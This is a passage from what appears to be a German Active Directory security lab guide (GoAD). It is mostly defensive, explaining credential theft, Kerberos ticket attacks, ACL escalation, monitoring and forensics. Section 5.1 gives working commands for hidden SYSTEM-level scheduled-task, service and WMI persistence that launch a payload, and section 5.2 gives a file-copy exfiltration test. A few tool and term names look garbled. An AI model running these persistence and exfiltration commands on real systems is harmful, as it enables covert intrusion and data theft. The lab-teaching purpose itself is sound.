- Verwende kontrollierte Datensätze, um Muster wie LSASS-Verarbeitung, Token-Manipulation oder Ticket-Verwendung zu analysieren.

Beispiele für sichere Dokumentation und Erkennung:
```
Beispiel-Dokumentation: Simulierte LSASS-Interaktionsprotokolle
- Ereignisse: Ungewöhnliche Zugriffsmuster auf LSASS-Prozess
- Indikatoren: Abweichende Prozessrechte, neue Signaturen, nicht signierte Module
- Gegenmaßnahmen: Aktivieren von Credential Guard, Telemetrie- und Detector-Tuning
```

Wichtige defensive Maßnahmen:
- Beschränke Berechtigungen auf Speicherebene, setze Schutzmechanismen wie Credential Guard ein.
- Reduziere Angriffsfläche durch Minimierung lokaler Privilegien, Deaktivierung unnötiger Dienste.
- Nutze robuste Audit-Strategien: Event-IDs, Sysmon-Detektionsregeln, Meldeketten an SIEM.

Zusammenfassend dient dieses Unterkapitel dazu, das theoretische Verständnis von Credential Dumping zu stärken, ohne praktische, schädliche Anwendungswege zu demonstrieren. Der Fokus liegt auf Erkennung, Schutz und sicherem, verantwortungsvollem Umgang im GoAD-Lab.

```
Pseudo-CLI-Demonstration (Konzeptionell, nicht ausführbar)
Tool: Mimikatz/Rubeus (simuliert)
Ziel: Demonstration der Datenerfassung ohne reale Abbildung
Ausgabeformen: Gelistete Token, Ticket-Strukturen, Logs
```

### 3.3 Pass-the-Hash, Pass-the-Ticket und Token-Manipulation

Pass-the-Hash (PtH), Pass-the-Ticket (PtT) und Token-Manipulation beziehen sich auf Techniken, mit denen Angreifer Authentifizierungsdaten oder Tickets verwenden oder missbrauchen, um sich seitlich im Netz zu bewegen oder Privilegien zu erhöhen. Im Kontext des GoAD-Lab wird der Fokus auf Verständnis, Erkennung und Abwehr gelegt, nicht auf konkrete Durchführungsschritte.

Kernthemen:
- Pass-the-Hash: Nutzung von NTLM-Hashes statt Klartextkennwörter, um sich bei Diensten anzumelden. Diese Technik ermöglicht lateral Movement, wenn Angreifer Hash-Werte in der Domäne nutzen darf.
- Pass-the-Ticket: Nutzung eines Kerberos-Tickets (TGT oder Dienstticket), um sich gegenüber Diensten zu authentifizieren, oft nach erfolgreicher Ticket-Erzeugung oder Ticket-Diebstahl.
- Token-Manipulation: Manipulation oder Duplizierung von Tokens (z. B. Token Impersonation) innerhalb eines Prozesses oder zwischen Prozessen, um erweiterte Berechtigungen zu erhalten.

Angreifbare Parameter im Netzwerk:
- Privilegierte Konten, SPN-Konfigurationen, misconfigurierte Delegationsregeln und lange Lebensdauern von Tickets erhöhen die Angriffsfläche.
- Legacy- oder schlecht konfiguriertes NTLM-Umfeld liefert zusätzliche Angriffsvektoren, obwohl Kerberos die Standardlösung darstellt.

Verteidigungs- und Do-at-Home-Ansätze:
- Kerberos nur bevorzugen, NTLM soweit wie möglich deaktivieren oder einschränken.
- Verwende Protected Users-Gruppe, Reduced-Privilege-Accounts, Privilege Access Management.
- Erhöhe Transparenz durch gute Auditing-Strategien: Detektoren für unübliche Ticket-Verwendungen, PtH-/PtT-ähnliche Muster, oder Token-Manipulation in Echtzeit erkennen.
- Segmentierung, Zero-Trust-Ansatz und Least-Privilege-Richtlinien.
- Schulung und Awareness: Sicherheitsbewusstsein der System- und Netzwerkadministratoren erhöhen.

Sichere Laborpraxis:
- Beim GoAD-Lab wird Wert darauf gelegt, wie Erkennungsmuster in Logs und Telemetrie erscheinen, ohne tatsächliche Angriffe zu demonstrieren.
- Dokumentiere hypothetische Pfade, Wachsamkeitsindikatoren und Gegenmaßnahmen in der Labordokumentation.
- Verwende simulierte Daten, um typische Pfade besser zu verstehen.

Beispielhafte, konzeptionelle Darstellung:

```
Konzeptioneller Ablauf (PtT/PtH)
1. Credential-Objekte werden im Speicher beobachtet
2. Ticket- oder Hash-Verwendung wird durch Audit-Loggen beobachtet
3. Detektionslogik prüft Lateral-Movement-Muster
4. Gegenmaßnahmen aktivieren: Verstärkung der Protokollierung, Einschränkungen der Delegation
```

Zusammenfassend erklären diese Konzepte, wie Angreifer potenziell Authentifizierungsdaten missbrauchen könnten, während GoAD-Lab den Fokus auf Erkennung, Prävention und sichere Laborpraxis legt. Der sichere Umgang mit PtH, PtT und Token-Manipulation setzt auf Minimierung von Angriffsflächen, starke Authentifizierungsrichtlinien und umfassende Telemetrie, damit Verteidigungsteams frühzeitig reagieren können.
## Zugriffserweiterung, Privilege Escalation und AD-Lateral Movement

### 4.1 Privilegien-Eskalationstechniken in AD (Misconfigurations, ACLs)

Active Directory (AD) ist durch seine zentrale Verwaltungskonfiguration besonders anfällig für Privilege-Escalation, wenn Misconfigurations oder fehlerhafte ACLs vorliegen. In defensiver Perspektive gilt es, potenzielle Pfade frühzeitig zu identifizieren, zu verstehen, wie Angreifer sie nutzen könnten, und Gegenmaßnahmen abzuleiten. Das Kapitel fokussiert auf typische Muster, die in Praxisberichten und Audits eine Rolle spielen, ohne operative Anleitungen zu liefern.

Wichtige Konzepte und Muster
- Überfrequente ACLs auf sensiblen Objekten:
  - Objekte wie Gruppen, OU-Container oder Service-Accounts können unabsichtlich so konfiguriert sein, dass ihnen mehr Schreibrechte gewährt werden als nötig. Insbesondere WriteDacl- oder WriteOwner-Rechte auf kritischen Objekten ermöglichen es Angreifern, eigene Zugriffe zu erweitern.
  - Typische Risikokonstellationen: ein normales Benutzerkonto erhält indirekt Rechte, die ihm ermöglichen, Gruppenmitgliedschaften zu ändern oder DACLs anderer Objekte zu modifizieren.
- Delegationen und administrative Rollen:
  - Ungezielt verteilte oder zu großzügig gesetzte Delegationen (z. B. unconstrained delegation, unconstrained Kerberos-Delegation auf Dienstkonten) schaffen potenzielle Brücken zwischen niedrig privilegierten Konten und privilegierten Aktionen.
  - Fehlkonfigurationen rund um AdminSDHolder oder Protected Groups können dazu führen, dass besonders schützenswerte Accounts nicht zuverlässig geschützt sind.
- Gruppen- und Membership-Design:
  - Mitgliedschaften in leistungsstarken Gruppen (Domain Admins, Enterprise Admins) sind oft der Endpunkt eines Eskalationspfads, insbesondere wenn zusätzliche ACL-ähnliche Rechte auf Gruppenebene bestehen.
  - SAS-ähnliche Muster wie ein Dienstkonto, das weitere Rechte auf OU- oder Objekt-Ebene besitzt, erhöhen das Risiko.
- Service-Accounts und SPNs:
  - Service-Konten mit übermäßigen Rechten oder fehlerhaft gesetzten SPNs können missbraucht werden, um ACLs neu zu interpretieren oder Delegationen auszunutzen.
- AdminSDHolder und zeitliche Stabilität:
  - Wenn Schutzmechanismen wie AdminSDHolder nicht konsistent durchgesetzt werden, können Änderungen an privilegierten Gruppenmitgliedschaften zu unberechtigtem Zugriff führen.

Beispiele aus defensiver Sicht
- Ein Audit zeigt, dass ein Otiv-Account WriteDacl-Rechte auf die Gruppe Domain Admins besitzt. Das erhöht die Angriffsfläche, da der Angreifer potenziell neue Mitglieder hinzufügen oder bestehende Rechte verändern könnte.
- Ein OU-Objekt weist eine überhöhte Berechtigungsliste auf, die das Ändern von ACLs durch Nicht-Administratoren erlaubt. Solche Konstellationen sollten zeitnah analysiert und korrigiert werden.

Empfohlene Gegenmaßnahmen und Best Practices
- Minimieren und dokumentieren Sie administrative Delegationen. Verwenden Sie gezielte Rollen wie Just Enough Administration (JEA) und MFA-gestützte Prozesse.
- Sperren Sie WriteDacl- und WriteOwner-Berechtigungen auf sensiblen Objekten soweit möglich. Bewahren Sie eine klare Änderungsverfolgung (Audit-Logs) für ACL-Änderungen.
- Sichern Sie AdminSDHolder und Protected Groups: Regeln, dass privilegierte Konten geschützt bleiben und Änderungen nur nach formaler Genehmigung erfolgen.
- Implementieren Sie eine Prinzip der geringsten Privilegien (PoLP) für Gruppenmitgliedschaften; prüfen Sie regelmäßig, ob Mitglieder in privilegierte Gruppen aufgenommen werden müssen.
- Reduzieren Sie riskante Delegationen, vermeiden Sie unkonstrained Kerberos-Delegation; bevorzugen Sie Constrained Delegation, wo sinnvoll.
- Monitoring und Auditing:
  - Verfolgen Sie ACL-Änderungen an sensiblen Objekten.
  - Erfassen Sie Veränderungen der Mitgliedschaften in privilegierten Gruppen und ungewöhnliche Delegationsänderungen.
  - Integrieren Sie Warnungen bei Abweichungen in der Standardkonfiguration in SIEM-Systeme.

Beispielhafte Prüf-Checkliste (defensiv)
```
- Sind AdminSDHolder-Objekte wirklich geschützt?
- Welche Gruppen haben WriteDacl/WriteOwner auf kritischen Objekten?
- Welche Delegationen existieren (Constrained vs. Unconstrained)?
- Welche Service-Konten besitzen zu viele Rechte oder SPNs mit privilege-sensitivem Scope?
- Welche ACL-Änderungen wurden in letzter Zeit vorgenommen und wer hat sie veranlasst?
```

Defensive Abbildung von Ereignissen
```
- Beobachtete ACL-Änderungen auf sensiblen Objekten
- Neue Mitgliedschaften in Domain Admins oder Enterprise Admins
- Neue Delegationen oder Änderungen an Delegationsarten
```

Hinweis: Die hier dargestellten Inhalte dienen ausschließlich der defensiven Aufklärung und Laborausbildung. Änderungen an AD-Infrastrukturen sollten nur in autorisierten Umgebungen und gemäß geltenden Richtlinien erfolgen.

### 4.2 AD-ACLs, BloodHound-Analysen und Privilege Mapping

BloodHound bietet eine graphische Sicht auf Beziehungen in AD und macht potenzielle Privilege-Escalationpfade sichtbar. Der Fokus liegt auf der Erkennung von riskanten Abhängigkeiten statt auf operativen Exploits. In gut organisierten Umgebungen dient BloodHound der Risikoerkennung, indem es das Privilege-Mapping automatisiert visualisiert und potenzielle Pfade identifiziert, die zu privilegierten Konten führen könnten.

Kernkonzepte
- Datenquellen und Edge-Typen:
  - Mitgliedschaften, Berechtigung auf Objekten (z. B. ACL-Einträge), Ownership, Sessions, Trust-Beziehungen und administrative Beziehungen. Diese Edge-Typen ergeben ein Netzwerk aus Benutzern, Gruppen, Computern und Ressourcenkontexten.
- Privilege-Mapping:
  - Ziel ist die Identifikation von Pfaden, die von niedrig privilegierten Konten zu Hochprivilegien führen. Dazu gehören direkte Pfade (z. B. Mitgliedschaft in einer Admin-Gruppe) sowie indirekte Pfade über ACLs und Delegationen.
- Interpretationsperspektiven:
  - Weglängen: kurze Pfade mit wenigen Schritten sind oft interessanter für schnelle Bewegung, längere Pfade zeigen potenziell versteckte Privilegie-Berechtigungen.
  - Edge-Weighting: häufige Konstrukte wie WriteDacl, AdminTo, MemberOf liefern Hinweise auf potenziell missbrauchbare Zugriffsrechte.
- Defensive Nutzung:
  - Identifizieren Sie unautorisiert scheinende oder nicht dokumentierte Privilegien.
  - Prüfen Sie regelmäßig die Pfade, die zu Domain Admins oder sonstigen privilegierten Konten führen.
  - Erstellen Sie Berichte, in denen Risiko-Pfade visuell hervorgehoben werden; priorisieren Sie Korrekturmaßnahmen basierend auf der Risikobewertung.

Beispielhafte Analysepraktiken
- Ermitteln Sie alle Pfade von regulären Nutzern zu Domain Admins und bewerten Sie deren Plausibilität.
- Überprüfen Sie Pfade, in denen ACLs auf Objekten eine nicht notwendige Schreibberechtigung gewähren (z. B. WriteDacl, WriteOwner).
- Untersuchen Sie Delegationen, besonders unnötige oder lange gültige Delegationen.

Typische Gegenmaßnahmen aus der Analyse
- Entfernen oder Einschränken unnötiger ACLs und Delegationen.
- Einschränkung von Admin-Grupenzugehörigkeiten durch klare Richtlinien und regelmäßige Audits.
- Implementierung von Just Enough Administration (JEA) und eingeschränkter Admin-Workflows.
- Härtung der SPNs sowie sinnvolle Trennung von Privileged- und Normalbetrieb.
- Regelmäßige BloodHound-Reviews in Security-Operation-Cipelines (SOC) mit dokumentierten Abhilfemaßnahmen.

Beispiel-Tabellen zur Edge-Definition (defensives Verständnis)
```
| Edge-Typ | Bedeutung | Typische Risiko-Interpretation | Defensive Maßnahme |
|----------|-----------|-------------------------------|--------------------|
| MemberOf | Gruppenmitgliedschaft | Zugriff auf Ressourcen über Gruppenrechte | Überprüfen, wer in privilegierten Gruppen ist; Staffelung der Gruppenrechte |
| WriteDacl | Berechtigung, ACLs zu verändern | Potentieller Pfad zur Privilegienveränderung | Minimieren von WriteDacl-Berechtigungen auf sensiblen Objekten |
| AdminTo | Administrative Aktion gegenüber Objekt | Direkter Privilegienfluss zu einem Objekt | Beschränkung der administrativen Pfade, Audit-Logging aktivieren |
| Ownership | Besitz von Objekten | Einfluss auf Security-Settings und Rechtevergabe | Ownership-Changes überwachen; Ownership-Sharing vermeiden |
| Alloca | ACL-Berechtigungen auf Objekten | Kontrolle eigener Berechtigungen durch DACL | Audit und Restriktionen bei ACL-Vererbungen |
```

Hinweis zur praktischen Anwendung
- BloodHound sollte nur in autorisierten Umgebungen mit entsprechendem Verantwortungsbereich betrieben werden.
- Ergebnisse müssen kritisch validiert und mit den verantwortlichen Eigentümern des AD abgeglichen werden.
- Der Fokus liegt auf Risikosenkung und Prävention, nicht auf operativer Ausführung von Eskalationstechniken.

### 4.3 Golden Ticket, Silver Ticket und Kerberos-Tickets

Kerberos-Tickets bilden die Grundlage für Authentisierung in modernen AD-Umgebungen. Attacker-Aktivitäten rund um Kerberos-Tickets fallen unter die Kategorie der schwerwiegenden Latenzausnutzung, oft beschrieben durch Begriffe wie Golden Ticket und Silver Ticket. Aus defensiver Sicht werden diese Konzepte vorgestellt, um Verständnis für Risiken und Gegenmaßnahmen zu vermitteln, ohne operative Anleitungen zur Erzeugung oder Nutzung missbräuchlicher Tickets zu liefern.

Grundlagen und Unterschiede
- Kerberos-Tickets:
  - TGT (Ticket Granting Ticket) und TGS (Ticket-Granting Service) ermöglichen Authentisierung gegenüber Diensten in der Domäne.
  - Die TGT-Vergabe basiert auf dem KRBTGT-Konto, dessen kompromittierte oder missbrauchte Signaturen das Forging von TGTs erleichtern kann.
- Golden Ticket:
  - Ein Golden Ticket ist ein gefälschtes TGT, das einem Angreifer globale Domänen-Privilegien verschaffen kann. Die gefälschten Tickets können für Zugriff auf Domains, Ressourcen und Accounts verwendet werden, solange sie gültig sind.
  - Risikopotenzial: Hohe Privilegien, potenzielle vollständige Domänenkontrolle.
- Silver Ticket:
  - Ein Silver Ticket ist ein gefälschtes Service Ticket (TGS) für ein SPN (Service Principal Name). Dadurch kann ein Angreifer Zugang zu konkreten Diensten oder Hosts erlangen, ohne eine TGT zu benötigen.
  - Risikopotenzial: Eingeschränkte, aber zielgerichtete Bewegung zu bestimmten Services oder Hosts.
- Kerberos-Tickets allgemein:
  - Tickets haben Lebenszeiten; ungewöhnliche Lifetime-Verläufe oder Tickets außerhalb typischer Muster können Indikatoren für Missbrauch sein.

Defensive Erklärungen und Gegenmaßnahmen
- KRBTGT-Rotation:
  - Eine regelmäßige Rotation des KRBTGT-Kontos reduziert das Risiko aus kompromittierten Tickets. Nach einer Kompromittierung ist häufig eine zweimalige Rotation sinnvoll, gefolgt von weiteren Überprüfungen.
- Prinzip der Zugriffskontrolle:
  - Minimieren Sie die privilegierten Accounts und setzen Sie starke MFA für Admin-Accounts durch. Vermeiden Sie unnötige Service-Konten mit hohen Rechten.
- SPN-Hygiene:
  - Überprüfen Sie SPN-Registrierungen und SPN-Vererbungen. Entfernen Sie unnötige oder veraltete SPNs, um ungewollte Service-Tickets zu vermeiden.
- Ticket-Überwachung:
  - Prüfen Sie Kerberos-Tickets in den Logs (Anfragen, Gültigkeitsdauer, ungewöhnliche Muster). Atypische TGT-Anfragen außerhalb typischer Arbeitszeiten oder mit ungewöhnlicher Lebensdauer können Indikatoren sein.
- Netzwerk- und Identity-Schutz:
  - Segmentierung, MFA, Just-In-Time-Privilegien und verpflichtende Protokollierung helfen, den Schaden bei einem Ticket-Bernfall zu begrenzen.
- Incident Response und Remediation:
  - Bei Verdacht auf Ticket-Manipulation: isolieren Sie betroffene Konten, prüfen Sie LAPS-gestützte lokale Konten, führen Sie eine umfassende Domänen-Rotation durch, und beheben Sie die zugrunde liegenden Privilegien und Delegationen.

Beispielhafte Gegenmaßnahmen in einer defensiven Roadmap
```
- Kerberos-Ereignisse analysieren (TGT/TGS-Aktivitäten, ungewöhnliche Ticket-Lifetimes)
- KRBTGT-Konto rotieren (defensiv, in autorisiertem Umfeld)
- SPN-Überprüfungen und SPN-Minimierung durchführen
- Administrative Konten auf MFA umstellen; Just-in-Time-Administration nutzen
- ACLs und Delegationen überprüfen; Goldene Tickets durch risikoorientierte Audits ausschließen
```

Hinweis: Die hier dargestellten Inhalte dienen der Theorie, dem Verständnis von Sicherheitsrisiken und defensiven Maßnahmen. Praktische Schritte zur Erstellung oder Nutzung von Goldenen Tickets sind illegal und gefährlich. Sie sollten ausschließlich in kontrollierten Laborsituationen und mit ausdrücklicher Genehmigung erfolgen.
## KAPITEL: Persistence, Exfiltration und Operational Security im GoAD-Lab

### 5.1 Persistence-Mechanismen im Lab (Scheduled Tasks, Services, WMI)

Im GoAD-Lab dient Persistence dazu, Demonstrationen der Reaktionsmöglichkeiten zu ermöglichen, ohne reale Systeme zu gefährden. Ziel ist es, die Funktionsweisen wiederkehrender Zugriffsmethoden zu verstehen, ihre Erkennung zu üben und Gegenmaßnahmen zu testen. Die drei fokussierten Mechanismen Scheduled Tasks, Windows Services und WMI repräsentieren zentrale Persistenzpfade in Windows-Umgebungen. In der Praxis sollten diese Techniken ausschließlich in isolierten Laborumgebungen mit entsprechendem Genehmigungs- und Cleanup-Plan verwendet werden.

Scheduled Tasks
- Funktionsweise: Ein Task wird so konfiguriert, dass er bei einem bestimmten Trigger (z. B. Logon, Startup) eine definierte Aktion ausführt. Dadurch wird ein Prozess auch nach Neustarts erneut gestartet.
- Laborbeispiel (Erstellung): Der folgende PowerShell-Schnipsel demonstriert das Anlegen eines Tasks, der ein Payload-Skript bei BenutzerLogin ausführt. Verwende im Lab-Verzeichnis eine harmlose Testdatei.
```
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\GoADLab\payload.ps1"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "GoADLabPersistence" -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest
```
- Überwachung/Abgleich: Prüfe vorhandene Tasks mit:
```
schtasks /Query /TN "GoADLabPersistence" /V /FO LIST
```
- Entfernen/Aufräumen:
```
schtasks /Delete /TN "GoADLabPersistence" /F
```

Windows Services
- Funktionsweise: Ein Dienst läuft kontinuierlich oder nach einem Bootvorgang und kann mit hohem Privilegienumfang gestartet werden.
- Laborbeispiel (Erstellung): Ein harmloser Dienst kann mit sc oder PowerShell installiert werden.
```
sc create GoADLabSvc binPath= "C:\GoADLab\payload.exe" start= auto
sc description GoADLabSvc "GoADLabPersistence-Service"
```
- Überwachung/Abgleich:
```
sc query GoADLabSvc
```
- Entfernen/Aufräumen:
```
sc delete GoADLabSvc
```

WMI-Persistenz
- Funktionsweise: WMI kann persistent ausgeführt werden, indem Event-Filter, Consumer und Bindings erstellt werden, die bei bestimmten Systemereignissen einen Befehl ausführen.
- Laborbeispiel (vereinfachte Darstellung): Nutze WMI-Ereignisabfragen und Consumer, um bei einem spezifischen Trigger ein Payload-Skript zu starten. Ein sicherer Ansatz ist die Verwendung von Register-WMIEvent in PowerShell:
```
Register-WmiEvent -Query "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'" -Action { & "C:\GoADLab\payload.ps1" }
```
- Alternativ (persistenteres Muster) mit WMI-Objekten:
```
$filter = New-WmiInstance -Namespace "root\subscription" -Class __EventFilter
$consumer = New-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer
# Name, Template und Pfade konfigurieren, dann Binding herstellen
# (Komplexere Konfiguration erfordert CIM-Objekte; sicher in Lab-Umgebung testen)
```
- Aufräumen:
```
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter -Filter "Name='GoADLab_WMI_Persistence'" | Remove-WmiObject
```
- Sicherheitshinweis: WMI-Persistence ist besonders sichtbar in Eventlogs und überwachbaren Systemprozessen. Ziel im Lab ist nicht die permanente Verdeckung, sondern das Verständnis der Erkennungslogik.

Zusammenfassung und Best Practices
- Vermeide ernsthafte Privilegien in der Lab-Umgebung außer es ist notwendig und autorisiert.
- Dokumentiere jede Persistenzregel, damit sie später sauber entfernt werden kann.
- Nutze konsistente Cleanup-Skripte, um Nebeneffekte auf nachfolgende Tests zu verhindern.
- Kombiniere Persistenz-Tests mit entsprechenden Erkennungs- und Logging-Checks in deinem AD-Lab.

### 5.2 Datenexfiltration, Audit-Trails und Sicherheitsüberwachung

In einem AD-Lab dient der Abschnitt der Übung von Datenexfiltration, Audit-Trails und Sicherheitsüberwachung dazu, mögliche Angriffsabläufe auf Datenbewegungen zu erkennen und Gegenmaßnahmen zu testen. Exfiltration bezeichnet das heimliche oder unautorisierte Verschieben von Daten aus dem Unternehmensnetzwerk in externe Zonen. In der Praxis können hierfür verschiedene Kanäle genutzt werden: Netzwerkfreigaben (SMB/UNC), E-Mail, USB-Geräte, Cloud-Speicher oder legitime Web-Dienste. Die Herausforderung besteht darin, normale Betriebsabläufe von bösartigen Übertragungen zu unterscheiden und frühzeitig Alarm zu schlagen.

Audit-Trails und Sicherheitsüberwachung umfassen die Erfassung, Speicherung und Analyse von Ereignissen aus Security-, System-, Anwendungs- und Netzwerksicht. Ziel ist eine lückenloseNachverfolgung von Zugriffen, Änderungen und Kommunikationsmustern. Im Lab werden zunächst Baselines gesetzt, danach Alarmregeln definiert und schlussendlich ein zentrales Logging- und Monitoring-System aufgebaut.

Beispielhafte Maßnahmen und Befehle
- Aktivierung der Audit-Kategorien auf Betriebssystemebene:
```
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Object Access" /success:enable /failure:enable
```
- Ablage von Auditlogs zentralisieren (Basis-Einrichtung; konkret je nach SIEM/Collector):
```
wecutil qc
```
- Dateisystem-Auditierung für sensible Ordner (Beispiel):
```
icacls "C:\GoADLab\Sensitive" /audit Everyone:(F)
```
- Netzwerkaus- bzw. ausgehende Verbindungen beobachten:
```
netstat -ano | findstr ESTABLISHED
```
- Testdaten exfiltrieren (Test in Lab): 
```
Copy-Item "C:\GoADLab\TestData.txt" "\\ExternalRepo\GoADLab\TestData.txt" -Force
```

Datenexfiltration im Lab sollte immer kontrolliert erfolgen: Verwende isolierte Konten, begrenze Bandbreite, halte den Zeitraum kurz und dokumentiere alle Testläufe. Zur Überwachung sind folgende Kriterien sinnvoll:
- Ungewöhnlich große oder unnormale Outbound-Verbindungen zu externen Zielen.
- Häufige Nutzung von seltenen Anwendungen oder PowerShell-Skripten im Zusammenhang mit Dateizugriffen.
- Unerwartete Aktivitäten in E-Mail- oder Cloud-Schnittstellen.

Hinweise zur Dokumentation
- Erstelle eine Übersicht der typischen Exfiltrationspfade in deiner Lab-Topologie (z. B. SMB, Cloud-SDKs, Mail-Relays). Eine klare Zuordnung der Pfade zu Erkennungsregeln erleichtert die spätere Analyse.
- Nutze Audit-Keys, um Ereignisse zeitlich zu korrelieren: Wer hat wann welcher Datei welchen Speicherort geändert oder übertragen?
- Halte den Clean-up prozess fest, damit der Labormodus erneut gestartet werden kann, ohne Spuren zu hinterlassen.

Tabellenbeispiel (Monospace)
```
| Kanal            | Typische Indikatoren           | Gegenmaßnahmen                                     |
|------------------|---------------------------------|-----------------------------------------------------|
| SMB/Dateifreigabe| Ungewöhnliche Zugriffsmuster     | Netzwerk-ACLs, Normalisierung von Zugriffen           |
| E-Mail           | Große Anhänge, verdächtige Empfänger| DLP-Scanner, Anomalie-Erkennung in Postfächern       |
| USB/Wechseldatenträger | Neue USB-Geräte, Copy-Events | Geräteblockierung, Auditing von Dateizugriffen      |
| Cloud-Speicher   | Ungewöhnliche Transfers zu externen Buckets | API-MfCs, Zugriff-Nutzung pro Benutzer                 |
```

Schritte zur Umsetzung im Lab
- Definiere eine sichere Testdatei als Exfiltration-Ziel und eine definierte Zeitspanne.
- Implementiere Audit- und Monitoring-Regeln, die speziell auf diese Testfälle reagieren.
- Führe kontrollierte Tests durch und dokumentiere alle Beobachtungen (Logs, Alerts, Reaktionszeiten).

### 5.3 Monitoring, Detection und Forensik im AD-Labor

Monitoring, Detection und Forensik bilden das Fundament für eine zuverlässige Defensive im AD-Labor. Ziel ist es, Anomalien rechtzeitig zu erkennen, gezielte Gegenmaßnahmen einzuleiten und im Nachgang eine forensisch saubere Analyse zu ermöglichen. Dazu gehören zentrale Logging-Strategien, Detektionslogik, Incident-Reaktion und forensische Methoden zur Beweissicherung.

Monitoring und Detection
- Zentrale Logging-Architektur: Sammle Security-, System- und Anwendungslogs von Domain-Controllern, Endpunkten und wichtigen Servern in einen zentralen Log-Store oder SIEM.
- Sensorik im Lab: Sysmon (Security-Event-Logging auf Prozesse, Netzwerkverbindungen, Dateiaktivitäten), Windows-Ereignislogs, Firewall-Logs sowie Anwendungslogs.
- Standard-Detektionslogik: Erstelle Regelwerke, die typische Angriffsvektoren abdecken (z. B. ungewöhnliche Anmeldungen, neue Persistenzmechanismen, Credential Dumping-Versuche, Port-Scans, unerwartete Prozessstarts).
- Beispielregeln (Konzept): 
  - Ungewöhnliche Scheduled-Tasks oder neue Services mit Privilegienerhöhung.
  - Unerwartete Prozessstarts mit PowerShell oder WMI-Konnektoren.
  - Netstat-/Firewall-Ausgänge zu unbekannten Zielen während Arbeitszeiten.

Forensik
- Beweissicherung: Stoppe automatische Logs nicht unbeabsichtigt, sichere festplattenbasierte Images, sammle Speicherabbilder in einem unveränderlichen Format.
- Speicherauswertung: Nutze Tools wie Volatility oder Rekonstruktionstechniken, um Prozesse, Network Connections und versteckte Modules im Arbeitsspeicher zu identifizieren.
- Timeline-Analysen: Erstelle eine Ereignistimeline aus Logs (Anmeldungen, Prozessstarts, Dateizugriffe, Netzwerkverbindungen) und suche nach Korrelationen.
- Beweissicherungsschritte: Patch- und Patch-Management-Status prüfen, Audit-Trails sichern, Hash-Werte relevanter Dateien erfassen.

Beispiel-Technologien und Workflows
- Sysmon-Konfiguration (Minimal-Konfig-Datei)
```
<Sysmon schemaversion="4.20">
  <EventFiltering>
    <NetworkConnect onmatch="exclude">
      <DestinationIs.internet />
    </NetworkConnect>
  </EventFiltering>
</Sysmon>
```
- Zentralisierung der Logs (WinCollect, WEF, oder ein SIEM-Connector)
```
# Beispielbefehl zum Sammeln von Windows-Ereignissen mittels Windows Event Forwarding (WEF)
wecutil qc /q
```
- Forensischer Workflow in der Praxis:
  1) Erfassung eines sauberen Memory-Dumps (vorher Absicherung):
     ```
     winpmem.exe -dump -output memory.raw
     ```
  2) Analyse der Timeline:
     ```
     timeskew -t memory.raw
     ```
  3) Vergleich mit Baselines, um Anomalien zu identifizieren.

Best Practices
- Definiere klare Baselines für Normalverhalten in der AD-Umgebung.
- Implementiere tamper-evident Logstorage und regelmäßige Integritätsprüfungen.
- Führe regelmäßige, strukturierte Übungen durch (Red/Blue-Teams) und dokumentiere alle Ereignisse, Reaktionen und Ergebnisse.
- Nutze Automatisierung, um Alarmflüsse, Playbooks und incident-specific Dashboards zu standardisieren.

Hinweise zur Dokumentation
- Erstelle eine übersichtliche Dokumentation der Monitoring-Konzepte, Detektionsregeln und Forensik-Workflows.
- Halte Fest, welche Tools in deinem Lab vorhanden sind, welche Logs gesammelt werden und wie Zugriffe historisiert werden.
- Plane regelmäßige Cleanup- und Wiederholungsprüfungen, um das Lab konsistent neu starten zu können.
## KAPITEL: Toolsammlung, Automatisierung und Workflows im GoAD-Lab

### 6.1 Aufbau eines effektiven Tool-Sets: CLI vs GUI

Ein gut konzipiertes Tool-Set bildet das Rückgrat jedes GoAD-Labs. Es ermöglicht reproduzierbare Aktivitäten, reduziert manuelle Fehler und unterstützt sowohl explorative Phasen als auch reproduzierbare Tests. Bei der Auswahl von CLI-Tools (Command-Line Interface) versus GUI-Tools (Graphical User Interface) stehen Zielsetzung, Lernkurve, Skalierbarkeit und Teamkultur im Fokus.

CLI-Ansätze bevorzugen sich dort, wo Wiederholbarkeit, Versionierbarkeit und Automatisierung im Vordergrund stehen. Typische Anwendungsfelder sind Domänen- und Objektabfragen, Massenoperationen, Logging und die Einbindung in Pipelines. Vorteile:
- Hohe Reproduzierbarkeit durch Skripte
- Leichte Integration in CI/CD- und Audit-Prozesse
- Geringerer Overhead bei Remote-Execution
- Schneller Einstieg in automatisierte Abläufe mit Modulen oder Bibliotheken

 GUI-Ansätze eignen sich vor allem für explorative Aufgaben, Visualisierungen, Mustererkennung in Graphen und das ad-hoc-debugging- bzw. -analysieren von Beziehungen. Vorteile:
- Intuitive Visualisierung von Beziehungen (z. B. Beziehungsgraphen)
- Schnellere Orientierung bei neuen Umgebungen
- Weniger Einstiegshürde für Mitarbeitende, die weniger Skripts schreiben
- Besseres Mapping von Berechtigungen und Pfaden in einer Domainsstruktur

Ein hybrides Modell, das die Stärken beider Ansätze vereint, ist in GoAD-Labs besonders wirkungsvoll:
- Core-Automatisierung über PowerShell oder Python-Skripte
- GUI-Tools für Mapping, Pattern-Erkennung und Berichte
- Eine zentrale Repositoriumsprache (z. B. JSON oder YAML) zur Orchestrierung von Workflows
- Einheitliche Logging-Standards, Versionskontrolle und friedliche Testumgebungen

Beispiele für typische Tools (Kategorien, CLI/GUI, Zweck):
```
| Tool                 | Typ       | Typische Aufgaben                         | Vorteile                              | Nachteile                          |
|----------------------|-----------|--------------------------------------------|---------------------------------------|-----------------------------------|
| PowerShell-Module    | CLI       | AD-Abfragen, Benutzer-/Computer-Objekte     | Tiefer Windows-Integrationsgrad, Skripting | Windows-basiert, Lernkurve         |
| BloodHound            | GUI       | Beziehungsgraphen, Privilege-Escape-Muster    | Visuelle Muster, schnell erkennbar      | Weniger reproducible, manuelle Schritte |
| RSAT (Toolsammlung)  | GUI/CLI   | AD-Verwaltung, Konfiguration                   | Integration in Windows-Umgebung          | Overhead, nicht immer ideal für Automation |
